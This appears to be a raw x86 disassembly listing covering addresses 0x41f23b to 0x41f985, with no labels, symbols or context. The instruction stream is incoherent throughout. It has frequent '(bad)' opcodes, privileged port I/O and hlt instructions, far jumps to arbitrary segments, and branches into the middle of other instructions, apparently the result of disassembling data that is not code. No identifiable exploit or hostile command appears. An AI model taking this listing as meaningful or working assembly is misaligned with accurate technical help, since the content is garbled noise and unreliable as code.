  41f23b:	push   ss
  41f23c:	mov    eax,0x934a7c0b
  41f241:	pop    edx
  41f242:	mov    edx,ebx
  41f244:	rcl    DWORD PTR [eax-0xe],0x0
  41f248:	xor    esi,ebp
  41f24a:	push   ebx
  41f24b:	(bad)  
  41f24c:	sub    al,0xcf
  41f24e:	retf   
  41f24f:	mov    al,ds:0x2192ffdb
  41f254:	or     dl,BYTE PTR [edi+0x771929ac]
  41f25a:	cmp    al,0xf2
  41f25c:	push   edi
  41f25d:	call   0x5cf73885
  41f262:	pop    esp
  41f263:	mov    DWORD PTR ds:0x688ee736,ebp
  41f269:	push   cs
  41f26a:	inc    edi
  41f26b:	lahf   
  41f26c:	push   ebp
  41f26d:	pop    edx
  41f26e:	imul   ebx,DWORD PTR [ecx+ebp*1],0xf0ee1656
  41f275:	cld    
  41f276:	pop    ebp
  41f277:	add    eax,0xecfee788
  41f27c:	ja     0x41f21b
  41f27e:	mov    ecx,0x311ef411
  41f283:	mov    edx,0xf01d9548
  41f288:	pop    ebp
  41f289:	rcr    ah,1
  41f28b:	call   0x87f26752
  41f290:	mov    eax,0x72cd640a
  41f295:	jbe    0x41f24d
  41f297:	lods   eax,DWORD PTR ds:[esi]
  41f298:	bound  edx,QWORD PTR [edx+0x5b0e73ca]
  41f29e:	lods   eax,DWORD PTR ds:[esi]
  41f29f:	mov    bh,0xdf
  41f2a1:	and    al,0xe5
  41f2a3:	sbb    BYTE PTR [ebx-0x301312e5],cl
  41f2a9:	or     eax,0xc094e125
  41f2ae:	pushf  
  41f2af:	add    BYTE PTR [esi],0x2e
  41f2b2:	mov    esi,esp
  41f2b4:	nop
  41f2b5:	adc    al,0x1b
  41f2b7:	out    0x2e,al
  41f2b9:	or     DWORD PTR [eax-0x3bcdc265],edi
  41f2bf:	pop    esi
  41f2c0:	mov    ah,0x65
  41f2c2:	mov    DWORD PTR [ebx-0x7f],ecx
  41f2c5:	jo     0x41f2f4
  41f2c7:	jl     0x41f347
  41f2c9:	lock call 0x83a2e843
  41f2cf:	mov    eax,ds:0x7d6c0cf3
  41f2d4:	inc    ebx
  41f2d5:	sub    DWORD PTR [ebx+esi*8-0x3f1fe5c2],0x3c
  41f2dd:	lds    eax,FWORD PTR [edi-0x2b608e66]
  41f2e3:	adc    eax,0xa4227c3a
  41f2e8:	adc    DWORD PTR [ebx+0x2a],edx
  41f2eb:	xlat   BYTE PTR ds:[ebx]
  41f2ec:	xchg   esp,eax
  41f2ed:	test   DWORD PTR [eax+0x485e7313],eax
  41f2f3:	imul   eax,DWORD PTR [esi+0x465f30f8],0x6a8a6f6a
  41f2fd:	div    BYTE PTR [esi]
  41f2ff:	mov    al,0x2
  41f301:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f302:	cmp    eax,0x50d7d9e0
  41f307:	or     dl,dh
  41f309:	pusha  
  41f30a:	das    
  41f30b:	mov    ecx,0xe10532ff
  41f310:	(bad)  
  41f311:	out    0x3c,eax
  41f313:	in     eax,dx
  41f314:	mov    ebp,0x2e4cd2fe
  41f319:	sub    al,0xe8
  41f31b:	cmp    ebx,DWORD PTR [ebx]
  41f31d:	mov    ds:0xa93afe7a,al
  41f322:	dec    ebp
  41f323:	(bad)  
  41f324:	(bad)  [eax-0x1ab920ad]
  41f32a:	js     0x41f2d7
  41f32c:	pop    ds
  41f32d:	sub    bl,BYTE PTR [edi]
  41f32f:	adc    ebp,esi
  41f331:	jmp    0xb31e:0x9ab9b2be
  41f338:	adc    BYTE PTR [edi],ch
  41f33a:	mov    dl,0x70
  41f33c:	hlt    
  41f33d:	inc    eax
  41f33e:	mov    BYTE PTR [edx],bl
  41f340:	repz lahf 
  41f342:	jmp    0x41f399
  41f344:	push   edx
  41f345:	in     eax,dx
  41f346:	sar    DWORD PTR [esi-0x4d],cl
  41f349:	test   BYTE PTR [eax-0x3c],0xab
  41f34d:	in     eax,dx
  41f34e:	fs cdq 
  41f350:	jecxz  0x41f387
  41f352:	inc    edi
  41f353:	cmc    
  41f354:	dec    ebx
  41f355:	sub    eax,0x7ce9d897
  41f35a:	stos   DWORD PTR es:[edi],eax
  41f35b:	data16 daa 
  41f35d:	and    ecx,ebp
  41f35f:	xchg   WORD PTR [esi-0x4d],dx
  41f363:	lods   al,BYTE PTR ds:[esi]
  41f364:	jne    0x41f2f7
  41f366:	data16 mov dh,0x41
  41f369:	mov    dl,0x5e
  41f36b:	add    al,0x85
  41f36d:	jp     0x41f372
  41f36f:	idiv   ecx
  41f371:	lea    esi,[ebx-0x6f570dd6]
  41f377:	fmul   DWORD PTR [esi]
  41f379:	das    
  41f37a:	push   es
  41f37b:	xor    ebp,DWORD PTR [eax+ecx*8+0x409ca2e1]
  41f382:	hlt    
  41f383:	sbb    eax,edi
  41f385:	adc    DWORD PTR [eax],ebx
  41f387:	or     bh,dl
  41f389:	jecxz  0x41f34f
  41f38b:	mov    BYTE PTR [ecx-0x2738d5c1],bl
  41f391:	nop
  41f392:	frstor [esi-0x2e]
  41f395:	fwait
  41f396:	sub    DWORD PTR [ebp+0x1a],eax
  41f399:	add    DWORD PTR [ebx],edx
  41f39b:	pop    esi
  41f39c:	inc    ecx
  41f39d:	jae    0x41f37e
  41f39f:	inc    eax
  41f3a0:	clc    
  41f3a1:	xor    esi,DWORD PTR [edx-0x59d0c251]
  41f3a7:	lods   eax,DWORD PTR gs:[esi]
  41f3a9:	xchg   esp,edi
  41f3ab:	inc    ebx
  41f3ac:	ja     0x41f3c5
  41f3ae:	call   0xed6fcc6
  41f3b3:	cwde   
  41f3b4:	fcomi  st,st(3)
  41f3b6:	scas   al,BYTE PTR es:[edi]
  41f3b7:	adc    al,0x7a
  41f3b9:	lock mov ds:0xb82b8b53,eax
  41f3bf:	shl    BYTE PTR [eax+ecx*8+0x6f4c82c4],cl
  41f3c6:	fst    st(6)
  41f3c8:	push   eax
  41f3c9:	xchg   esp,eax
  41f3ca:	jecxz  0x41f39b
  41f3cc:	mov    al,0xbc
  41f3ce:	pop    ss
  41f3cf:	pop    ds
  41f3d0:	mov    ah,0x74
  41f3d2:	dec    esp
  41f3d3:	push   ebx
  41f3d4:	or     ebp,DWORD PTR ds:0xeb8c80de
  41f3da:	xchg   eax,ecx
  41f3dc:	stos   DWORD PTR es:[edi],eax
  41f3dd:	(bad)  
  41f3de:	(bad)  
  41f3df:	fwait
  41f3e0:	pop    ss
  41f3e1:	xchg   edi,eax
  41f3e2:	xlat   BYTE PTR ds:[ebx]
  41f3e3:	and    BYTE PTR [esi+0x66c2e9fe],dl
  41f3e9:	stos   DWORD PTR es:[edi],eax
  41f3ea:	hlt    
  41f3eb:	sub    bh,dh
  41f3ed:	push   ecx
  41f3ee:	or     bh,BYTE PTR [eax]
  41f3f0:	xchg   esi,eax
  41f3f1:	sbb    al,0x36
  41f3f3:	arpl   WORD PTR [edx],ax
  41f3f5:	stos   DWORD PTR es:[edi],eax
  41f3f6:	retw   0x711d
  41f3fa:	dec    esi
  41f3fb:	push   0x76
  41f3fd:	pop    ebp
  41f3fe:	xchg   ebx,eax
  41f3ff:	and    edx,DWORD PTR ds:[edx+0x25]
  41f403:	data16 jno 0x41f3c1
  41f406:	sti    
  41f407:	nop
  41f408:	push   ss
  41f409:	dec    al
  41f40b:	jns    0x41f45d
  41f40d:	loop   0x41f406
  41f40f:	sub    bl,bl
  41f411:	daa    
  41f412:	sbb    cl,0xba
  41f415:	jecxz  0x41f401
  41f417:	push   edi
  41f418:	or     BYTE PTR [edx-0x64e437ce],dl
  41f41e:	add    al,0x85
  41f420:	and    BYTE PTR [ebp+0x34],ch
  41f423:	lds    edx,FWORD PTR [ecx]
  41f425:	(bad)  
  41f426:	fcmovnb st,st(3)
  41f428:	aas    
  41f429:	xchg   edx,eax
  41f42a:	lods   eax,DWORD PTR ds:[esi]
  41f42b:	or     bh,ah
  41f42d:	and    eax,0x32f653d5
  41f432:	dec    ebx
  41f433:	js     0x41f3f6
  41f435:	rol    edi,1
  41f437:	loope  0x41f468
  41f439:	mov    bh,0xb7
  41f43b:	inc    esp
  41f43c:	push   ds
  41f43d:	pop    ebp
  41f43e:	xor    eax,0xbbaaedb9
  41f443:	ror    ebp,0x8a
  41f446:	ret    0xea5c
  41f449:	mov    al,ds:0x3ef50ab4
  41f44e:	jb     0x41f4a0
  41f450:	jae    0x41f420
  41f452:	inc    esp
  41f453:	fisub  DWORD PTR [edx+eiz*4]
  41f456:	scas   eax,DWORD PTR es:[edi]
  41f457:	test   al,0x35
  41f459:	retf   0xa27a
  41f45c:	xchg   esi,eax
  41f45d:	lods   eax,DWORD PTR ds:[esi]
  41f45e:	dec    edi
  41f45f:	push   edx
  41f460:	push   es
  41f461:	popa   
  41f462:	in     eax,dx
  41f463:	aam    0x3c
  41f465:	pop    es
  41f466:	enter  0xd891,0xa2
  41f46a:	hlt    
  41f46b:	inc    ecx
  41f46c:	call   0x66982a0b
  41f471:	jnp    0x41f4af
  41f473:	out    0xf0,al
  41f475:	add    cl,BYTE PTR [edi+ebp*4-0x206a948a]
  41f47c:	mov    ds:0x745a12dc,al
  41f481:	xchg   ebx,eax
  41f482:	mov    BYTE PTR [esi+0x155d1eb7],bh
  41f488:	mov    ch,0x29
  41f48a:	sti    
  41f48b:	or     BYTE PTR [edi+0x7],bl
  41f48e:	mov    esi,0x8d732c4a
  41f493:	xchg   ecx,eax
  41f494:	retf   
  41f495:	in     al,dx
  41f496:	lds    esp,FWORD PTR [edx+0x16]
  41f499:	mov    edi,0xf4fa6cd6
  41f49e:	dec    edi
  41f49f:	mov    esp,0xf2d13edb
  41f4a4:	stos   BYTE PTR es:[edi],al
  41f4a5:	mov    ebp,edx
  41f4a7:	jnp    0x41f524
  41f4a9:	aaa    
  41f4aa:	cld    
  41f4ab:	mov    edi,DWORD PTR [ebp+0x6baabdf8]
  41f4b1:	imul   ebp,DWORD PTR [edi],0x1c
  41f4b4:	les    edi,FWORD PTR [edx+0x6c]
  41f4b7:	lock enter 0x2e72,0x9d
  41f4bc:	add    al,0xa5
  41f4be:	in     al,0xc5
  41f4c0:	sbb    ebp,DWORD PTR [ecx-0x18ecb4ec]
  41f4c6:	test   al,0x41
  41f4c8:	outs   dx,BYTE PTR ds:[esi]
  41f4c9:	push   0xa
  41f4cb:	fnstenv [eax+0x6e]
  41f4ce:	mov    al,0xd7
  41f4d0:	call   0x1b4c9908
  41f4d5:	push   edx
  41f4d6:	and    edi,DWORD PTR cs:[edx-0xc3332b8]
  41f4dd:	aas    
  41f4de:	stos   BYTE PTR es:[edi],al
  41f4df:	lea    esi,[eax-0x7fbb1cef]
  41f4e5:	jp     0x41f55b
  41f4e7:	jge    0x41f482
  41f4e9:	cmp    eax,0xbe2d9cb7
  41f4ee:	clc    
  41f4ef:	dec    edi
  41f4f0:	cmp    eax,0x719c02c
  41f4f5:	repnz push eax
  41f4f7:	in     eax,dx
  41f4f8:	xchg   edx,eax
  41f4f9:	lock mov cl,0x12
  41f4fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f4fd:	fmul   st(1),st
  41f4ff:	cmp    bh,BYTE PTR [ebp+ebp*8-0x5fdf54f1]
  41f506:	outs   dx,DWORD PTR ds:[esi]
  41f507:	inc    edx
  41f508:	xchg   edx,eax
  41f509:	xchg   esp,eax
  41f50a:	sbb    BYTE PTR [ebx],bh
  41f50c:	js     0x41f520
  41f50e:	and    BYTE PTR [esi+0x4a],dh
  41f511:	ja     0x41f551
  41f513:	lahf   
  41f514:	sbb    ah,BYTE PTR ds:0xa482876
  41f51a:	out    0x83,eax
  41f51c:	in     eax,dx
  41f51d:	lods   eax,DWORD PTR ds:[esi]
  41f51e:	fdiv   st,st(5)
  41f520:	adc    eax,0x12c12a38
  41f525:	cmp    BYTE PTR [ecx+0x1b],dh
  41f528:	iret   
  41f529:	jns    0x41f584
  41f52b:	add    dh,BYTE PTR [ebx+0xc]
  41f52e:	(bad)  
  41f530:	jmp    0x80e7eaca
  41f535:	push   cs
  41f536:	ins    BYTE PTR es:[edi],dx
  41f537:	jnp    0x41f4e9
  41f539:	mov    ebp,0xaf5040c5
  41f53e:	lea    esp,[edi+0x2292f0b6]
  41f544:	(bad)  
  41f545:	shl    BYTE PTR [esi+edx*8],1
  41f548:	jg     0x41f562
  41f54a:	xor    eax,0x129c3fcb
  41f54f:	out    0x81,al
  41f551:	xlat   BYTE PTR ds:[ebx]
  41f552:	ja     0x41f526
  41f554:	sti    
  41f555:	(bad)  
  41f556:	pop    edx
  41f557:	(bad)  
  41f558:	cdq    
  41f559:	int3   
  41f55a:	add    bl,BYTE PTR [ecx-0xb434b9d]
  41f560:	aam    0x30
  41f562:	fstp   TBYTE PTR [edi]
  41f564:	inc    ebp
  41f565:	(bad)
  41f568:	xchg   ecx,eax
  41f569:	pop    edi
  41f56a:	jae    0x41f563
  41f56c:	rol    DWORD PTR [esi+eiz*4-0x72],cl
  41f570:	xor    al,BYTE PTR [ecx+edi*1-0x7a]
  41f574:	xor    dl,BYTE PTR [ecx]
  41f576:	inc    ebx
  41f577:	sbb    dh,BYTE PTR [edi]
  41f579:	call   DWORD PTR [edx-0x1]
  41f57c:	out    0x12,al
  41f57e:	aam    0xb4
  41f580:	or     DWORD PTR [esi],esp
  41f582:	jl     0x41f54b
  41f584:	(bad)  
  41f585:	(bad)  [edx-0x6955155e]
  41f58b:	push   edx
  41f58c:	and    al,0xdf
  41f58e:	xchg   ebp,eax
  41f58f:	in     al,0x41
  41f591:	mov    al,0xc7
  41f593:	cs push 0x55
  41f596:	lahf   
  41f597:	xchg   esi,eax
  41f598:	sbb    DWORD PTR [edx+eax*8],esi
  41f59b:	daa    
  41f59c:	inc    ebp
  41f59d:	out    dx,eax
  41f59e:	mov    dh,0x4
  41f5a0:	loop   0x41f576
  41f5a2:	jb     0x41f56c
  41f5a4:	pop    esp
  41f5a5:	test   BYTE PTR [ecx+eiz*1],ch
  41f5a8:	in     eax,dx
  41f5a9:	out    0x3e,al
  41f5ab:	repz and al,0xb6
  41f5ae:	cmp    ebx,DWORD PTR [esi]
  41f5b0:	inc    esi
  41f5b1:	jp     0x41f5d8
  41f5b3:	sahf   
  41f5b4:	(bad)  
  41f5b5:	xor    BYTE PTR [edx-0x34],cl
  41f5b8:	in     al,dx
  41f5b9:	and    DWORD PTR ds:0x1cb7d5e1,esp
  41f5bf:	mov    bl,0x97
  41f5c1:	xchg   BYTE PTR [esp+ecx*2],ch
  41f5c4:	dec    edx
  41f5c5:	out    dx,al
  41f5c6:	daa    
  41f5c7:	mov    ebp,0x52360ada
  41f5cc:	stc    
  41f5cd:	dec    edx
  41f5ce:	sub    DWORD PTR [ecx-0x5510157],esi
  41f5d4:	pop    ecx
  41f5d5:	call   0x6518:0x4eec8e8e
  41f5dc:	or     eax,0x9ef49205
  41f5e1:	add    al,0x36
  41f5e3:	push   ebx
  41f5e4:	in     eax,0xc6
  41f5e6:	lahf   
  41f5e7:	in     eax,0xb1
  41f5e9:	or     eax,0x69d6c7c5
  41f5ee:	fidiv  WORD PTR [edx]
  41f5f0:	mov    cs,WORD PTR [ebx-0x63]
  41f5f3:	cmp    ecx,DWORD PTR [ebp-0x1749533d]
  41f5f9:	fdivr  DWORD PTR [ecx]
  41f5fb:	arpl   WORD PTR [ebp+0x536961e2],bp
  41f601:	iret   
  41f602:	ja     0x41f5b5
  41f604:	mov    ebx,0xa01c61c6
  41f609:	jno    0x41f5e8
  41f60b:	lea    edi,ds:0x19f0e3c2
  41f611:	or     BYTE PTR [ebx-0x11],0x23
  41f615:	test   al,al
  41f617:	in     al,0x62
  41f619:	iret   
  41f61a:	test   eax,0xf30f4281
  41f61f:	mov    ecx,0xbfaed874
  41f624:	les    eax,FWORD PTR [esi+edi*8]
  41f627:	cmp    DWORD PTR [eax+eax*4-0x6ce25f2d],edi
  41f62e:	lea    ecx,[ecx+0x25]
  41f631:	and    esp,DWORD PTR [eax+0x7d]
  41f634:	jb     0x41f5b7
  41f636:	gs inc edx
  41f638:	pop    ss
  41f639:	jp     0x41f5bc
  41f63b:	(bad)  
  41f63c:	pop    ds
  41f63d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f63e:	shr    DWORD PTR [ebp+0x18c67e7],0x7
  41f645:	jbe    0x41f60b
  41f647:	sbb    dh,0x82
  41f64a:	pop    esp
  41f64b:	mov    al,0x1b
  41f64d:	stos   DWORD PTR es:[edi],eax
  41f64e:	mov    ebx,0xad749777
  41f653:	and    DWORD PTR ds:0x6eb31dae,esp
  41f659:	out    0x16,al
  41f65b:	xlat   BYTE PTR ds:[ebx]
  41f65c:	pushw  0xe53f
  41f660:	xor    DWORD PTR [esi],ebx
  41f662:	mov    ecx,0xf84eafda
  41f667:	push   ds
  41f668:	mov    ah,0xf3
  41f66a:	rcl    DWORD PTR cs:[edx+0x5bebb478],0xb6
  41f672:	test   al,0x58
  41f674:	pop    edi
  41f675:	xchg   ebx,eax
  41f676:	push   ebx
  41f677:	xchg   edx,eax
  41f678:	sar    WORD PTR [edx+0x33],cl
  41f67c:	mov    edx,0xc0e1270d
  41f681:	and    DWORD PTR [esi+0x26],esp
  41f684:	push   cs
  41f685:	sub    DWORD PTR [ebx],ebx
  41f687:	inc    eax
  41f688:	jae    0x41f618
  41f68a:	out    dx,eax
  41f68b:	pop    edi
  41f68c:	xor    BYTE PTR [ecx+0x51],0x50
  41f690:	cs mov edx,0xcb1c8fd6
  41f696:	lea    esp,[eax]
  41f698:	aas    
  41f699:	cdq    
  41f69a:	xor    eax,0x4b19a339
  41f69f:	and    edi,DWORD PTR [ebx]
  41f6a1:	in     eax,dx
  41f6a2:	xlat   BYTE PTR ds:[ebx]
  41f6a3:	lea    ebx,[ecx-0x5c]
  41f6a6:	fst    DWORD PTR [esi+0x77]
  41f6a9:	popa   
  41f6aa:	mov    ds:0x4bbbcbae,eax
  41f6af:	mov    bh,0x1e
  41f6b1:	imul   eax,edi,0xffffffe8
  41f6b4:	sti    
  41f6b5:	call   FWORD PTR [esi-0x409a7f4d]
  41f6bb:	lock stos BYTE PTR es:[edi],al
  41f6bd:	jmp    FWORD PTR [edi-0x1a]
  41f6c0:	mov    ds:0xf4d79017,al
  41f6c5:	in     eax,dx
  41f6c6:	je     0x41f6f8
  41f6c8:	pop    ss
  41f6c9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f6ca:	xchg   ecx,eax
  41f6cb:	mov    edi,0xecd548ae
  41f6d0:	xor    BYTE PTR [ecx],ch
  41f6d2:	dec    ecx
  41f6d3:	add    ah,BYTE PTR [ecx-0x43430820]
  41f6d9:	push   ebp
  41f6da:	out    dx,al
  41f6db:	xchg   eax,esp
  41f6dd:	or     DWORD PTR [edx-0x8e2d1b9],esi
  41f6e3:	pop    es
  41f6e4:	and    DWORD PTR [edi],ebx
  41f6e6:	out    0x80,eax
  41f6e8:	cli    
  41f6e9:	rol    DWORD PTR [eax],1
  41f6eb:	inc    eax
  41f6ec:	mov    eax,ds:0xbc53eaf5
  41f6f1:	sbb    al,0x99
  41f6f3:	mov    bh,0x50
  41f6f5:	out    0xcb,al
  41f6f7:	arpl   di,sp
  41f6f9:	xor    eax,0x92d6ab2f
  41f6fe:	or     esi,DWORD PTR [esi-0x1e912f3]
  41f704:	aas    
  41f705:	call   0x5fce9189
  41f70a:	pop    esp
  41f70b:	sub    bl,ah
  41f70d:	xchg   BYTE PTR [edx-0x36],al
  41f710:	pop    ebp
  41f711:	fistp  QWORD PTR [ecx]
  41f713:	mov    edi,0x734a0c18
  41f718:	pop    edx
  41f719:	lds    ebp,FWORD PTR [edi-0x29]
  41f71c:	retf   0x4da9
  41f71f:	in     al,dx
  41f720:	mov    BYTE PTR [edx],al
  41f722:	push   ecx
  41f723:	ins    DWORD PTR es:[edi],dx
  41f724:	pop    es
  41f725:	jns    0x41f6c6
  41f727:	cmp    eax,0xe9e57f75
  41f72c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41f72d:	outs   dx,BYTE PTR ds:[esi]
  41f72e:	and    DWORD PTR [ebp+0x2ee86e4b],esp
  41f734:	sub    ebp,ebx
  41f736:	pusha  
  41f737:	adc    ah,bh
  41f739:	xchg   edi,eax
  41f73a:	adc    DWORD PTR [esi],ecx
  41f73c:	mov    bh,0xf3
  41f73e:	and    al,0x2f
  41f740:	enter  0x81fd,0x5f
  41f744:	pop    edx
  41f745:	inc    esi
  41f746:	mov    al,0xd
  41f748:	push   edx
  41f749:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41f74a:	ins    DWORD PTR es:[edi],dx
  41f74b:	xchg   ebp,eax
  41f74c:	inc    ebp
  41f74d:	enter  0xe6d1,0x85
  41f751:	or     al,0xde
  41f753:	mov    esp,0xd733f8ca
  41f758:	nop
  41f759:	or     cl,BYTE PTR [ebp-0x29]
  41f75c:	cmc    
  41f75d:	fisub  DWORD PTR [edi-0x3bef028a]
  41f763:	shl    BYTE PTR [edx+edi*8+0x2133a0b8],0x61
  41f76b:	ret    0x97c1
  41f76e:	nop
  41f76f:	cmp    eax,0xc3f06782
  41f774:	xchg   edi,eax
  41f775:	sbb    DWORD PTR [ecx-0x2d52cca0],0xf621fff
  41f77f:	xchg   edx,eax
  41f780:	in     eax,0xa
  41f782:	or     eax,0x1bafd5fe
  41f787:	and    bl,BYTE PTR [eax+0x6da267c7]
  41f78d:	stos   DWORD PTR es:[edi],eax
  41f78e:	xchg   edx,eax
  41f78f:	jmp    0x41f767
  41f791:	lods   eax,DWORD PTR ds:[esi]
  41f792:	mov    eax,ds:0x878f6aa5
  41f797:	or     edx,0x20505e52
  41f79d:	clc    
  41f79e:	push   ebp
  41f79f:	sbb    al,0x9a
  41f7a1:	or     al,0x8e
  41f7a3:	jge    0x41f7bc
  41f7a5:	dec    esi
  41f7a6:	and    al,ah
  41f7a8:	mov    al,ds:0xa7cc57a9
  41f7ad:	adc    edi,DWORD PTR [ecx]
  41f7af:	cli    
  41f7b0:	ret    
  41f7b1:	in     eax,dx
  41f7b2:	push   ecx
  41f7b3:	and    DWORD PTR [eax+0x8],esp
  41f7b6:	test   ebp,edx
  41f7b8:	xor    esp,DWORD PTR [eax-0xb]
  41f7bb:	cmp    edx,edx
  41f7bd:	rcl    ecx,cl
  41f7bf:	aas    
  41f7c0:	push   edx
  41f7c1:	lea    ebx,[ebx+0x4f4dd13d]
  41f7c7:	cmp    BYTE PTR [edx],cl
  41f7c9:	js     0x41f80f
  41f7cb:	gs push 0xffffff8d
  41f7ce:	cmp    al,0xa6
  41f7d0:	mov    bh,0xd2
  41f7d2:	jmp    0x56cd:0x740c329
  41f7d9:	retf   
  41f7da:	outs   dx,BYTE PTR ds:[esi]
  41f7db:	jns    0x41f80e
  41f7dd:	dec    ecx
  41f7de:	test   DWORD PTR [ecx+0x4bafdeb2],esp
  41f7e4:	dec    esp
  41f7e5:	sbb    al,0x29
  41f7e7:	dec    ecx
  41f7e8:	inc    eax
  41f7e9:	(bad)  
  41f7ea:	dec    ecx
  41f7eb:	xor    DWORD PTR [esi+0x19],ecx
  41f7ee:	into   
  41f7ef:	pop    ds
  41f7f0:	xchg   BYTE PTR [eax-0x3c3a4381],bl
  41f7f6:	outs   dx,BYTE PTR ds:[esi]
  41f7f7:	sti    
  41f7f8:	inc    edx
  41f7f9:	pop    edx
  41f7fa:	xor    ebx,edx
  41f7fc:	retf   0xecaf
  41f7ff:	mov    ebp,0x555c4021
  41f804:	retf   
  41f805:	outs   dx,DWORD PTR ds:[esi]
  41f806:	jg     0x41f813
  41f808:	xchg   esi,eax
  41f809:	dec    esp
  41f80a:	scas   al,BYTE PTR es:[edi]
  41f80b:	push   0x762c7f17
  41f810:	xchg   ecx,eax
  41f811:	sbb    DWORD PTR [ecx-0x7cdb6b40],edx
  41f817:	push   esp
  41f818:	pop    ebx
  41f819:	(bad)  
  41f81a:	out    dx,al
  41f81b:	les    ebx,FWORD PTR [esi]
  41f81d:	jmp    DWORD PTR [ecx-0x293d25aa]
  41f823:	popf   
  41f824:	inc    eax
  41f825:	cmc    
  41f826:	ffree  st(0)
  41f828:	shr    BYTE PTR [ebp-0x2d166b54],0xf6
  41f82f:	cmp    bh,0xea
  41f832:	jmp    0x5b90c6fe
  41f837:	mov    ebx,0x6385c48b
  41f83c:	sbb    eax,0xd75d29d6
  41f841:	icebp  
  41f842:	cmp    eax,0xa76c9ce1
  41f847:	(bad)  
  41f848:	sbb    al,0x99
  41f84a:	outs   dx,DWORD PTR ds:[esi]
  41f84b:	ret    0xb45b
  41f84e:	ret    
  41f84f:	rcr    BYTE PTR [edx+0x16b7ea3e],cl
  41f855:	lods   al,BYTE PTR ds:[esi]
  41f856:	fwait
  41f857:	push   cs
  41f858:	sbb    DWORD PTR [edi+edi*2-0x20],edi
  41f85c:	xor    eax,0x28214dea
  41f861:	push   edx
  41f862:	push   ss
  41f863:	outs   dx,BYTE PTR ds:[esi]
  41f864:	stos   BYTE PTR es:[edi],al
  41f865:	jnp    0x41f82f
  41f867:	ja     0x41f84a
  41f869:	loopne 0x41f85d
  41f86b:	fnstsw WORD PTR [ebp-0x3f]
  41f86e:	mov    WORD PTR [eax-0xe],?
  41f871:	shl    ch,1
  41f873:	pushf  
  41f874:	lods   eax,DWORD PTR ds:[esi]
  41f875:	add    edi,ebx
  41f877:	xchg   esi,eax
  41f878:	inc    ebp
  41f879:	hlt    
  41f87a:	pop    edx
  41f87b:	mov    bl,BYTE PTR [ecx+0x1]
  41f87e:	dec    eax
  41f87f:	and    DWORD PTR [edi],0x34
  41f882:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f883:	call   0xc386:0xff2bce30
  41f88a:	and    dh,bl
  41f88c:	adc    al,0xaa
  41f88e:	lds    esi,FWORD PTR [edi]
  41f890:	xlat   BYTE PTR ds:[ebx]
  41f891:	out    0xd9,al
  41f893:	cmp    esi,DWORD PTR [edi-0x23b4fa9f]
  41f899:	sub    al,0x32
  41f89b:	daa    
  41f89c:	fmul   DWORD PTR [esi+eax*2+0x25]
  41f8a0:	xchg   BYTE PTR [edx+0x14],cl
  41f8a3:	repz lea edx,[esi]
  41f8a6:	pop    ss
  41f8a7:	pop    edx
  41f8a8:	cld    
  41f8a9:	(bad)  
  41f8ab:	and    dh,BYTE PTR [edx+eax*4]
  41f8ae:	leave  
  41f8af:	cdq    
  41f8b0:	pop    esp
  41f8b1:	test   al,0x7
  41f8b3:	not    ch
  41f8b5:	push   ss
  41f8b6:	je     0x41f873
  41f8b8:	ret    0x8f4d
  41f8bb:	lahf   
  41f8bc:	mov    edi,0xf9fbe718
  41f8c1:	push   ss
  41f8c2:	lock bound eax,QWORD PTR [ebp-0x6f]
  41f8c6:	(bad)  
  41f8c7:	mov    ebp,0x6c7fdd7b
  41f8cc:	push   esp
  41f8cd:	data16 jnp 0x41f910
  41f8d0:	inc    esp
  41f8d1:	xor    edi,DWORD PTR [edx]
  41f8d3:	push   DWORD PTR [edi-0x38]
  41f8d6:	inc    esp
  41f8d7:	jg     0x41f8d8
  41f8d9:	sub    BYTE PTR [eax],bh
  41f8db:	jmp    0x4a02:0x314e7e15
  41f8e2:	pop    ecx
  41f8e3:	jge    0x41f8fe
  41f8e5:	add    ecx,esp
  41f8e7:	pop    ecx
  41f8e8:	rcl    BYTE PTR [ebp+0xd],cl
  41f8eb:	xor    eax,DWORD PTR [esi-0x2e]
  41f8ee:	xchg   BYTE PTR [esi],al
  41f8f0:	and    DWORD PTR cs:[ebp-0x4972f10],eax
  41f8f7:	(bad)  
  41f8f8:	pop    ss
  41f8f9:	out    0x2c,eax
  41f8fb:	pop    ss
  41f8fc:	mov    dl,0x4c
  41f8fe:	aam    0xdd
  41f900:	out    0x0,al
  41f902:	jp     0x41f8c6
  41f904:	add    eax,0x8a250e3d
  41f909:	mov    bl,0xe8
  41f90b:	rcl    DWORD PTR [edi],0xfe
  41f90e:	fisttp QWORD PTR [ebx+0x3f]
  41f911:	ins    BYTE PTR es:[edi],dx
  41f912:	mov    dl,0xee
  41f914:	fwait
  41f915:	nop
  41f916:	out    dx,al
  41f917:	in     eax,0x94
  41f919:	test   eax,0x8da4342
  41f91e:	adc    eax,edx
  41f920:	(bad)  
  41f921:	jo     0x41f8fb
  41f923:	mov    DWORD PTR [esp+edx*8-0x17bfb91f],eax
  41f92a:	int3   
  41f92b:	push   ecx
  41f92c:	mov    bl,0x7a
  41f92e:	mov    eax,0xc48c3be3
  41f933:	popf   
  41f934:	jo     0x41f910
  41f936:	push   ecx
  41f937:	jnp    0x41f8d6
  41f939:	fwait
  41f93a:	adc    edi,DWORD PTR [eax+0x67]
  41f93d:	dec    eax
  41f93e:	jge    0x41f8c0
  41f940:	xchg   esi,eax
  41f941:	mov    edx,0xfd238146
  41f946:	ss and eax,0x4029f259
  41f94c:	out    dx,eax
  41f94d:	mov    eax,ds:0x3efc5aaa
  41f953:	ja     0x41f944
  41f955:	jb     0x41f924
  41f957:	cmp    al,0xc2
  41f959:	cdq    
  41f95a:	jno    0x41f8f3
  41f95c:	push   ds
  41f95d:	pusha  
  41f95e:	ds pusha 
  41f960:	jne    0x41f93b
  41f962:	int    0x17
  41f964:	dec    esp
  41f965:	in     al,0x8b
  41f967:	mov    eax,ds:0xc722bb1d
  41f96c:	outs   dx,DWORD PTR ds:[esi]
  41f96d:	inc    ecx
  41f96e:	or     BYTE PTR [edi+0x73],al
  41f971:	ss pop ecx
  41f973:	(bad)  
  41f974:	clc    
  41f975:	fs push esp
  41f977:	jmp    FWORD PTR [eax-0x730b6bbc]
  41f97d:	xchg   ebx,eax
  41f97e:	dec    ebx
  41f97f:	add    eax,0x4e6280c4
  41f984:	aaa    
  41f985:	and    bh,0xfd
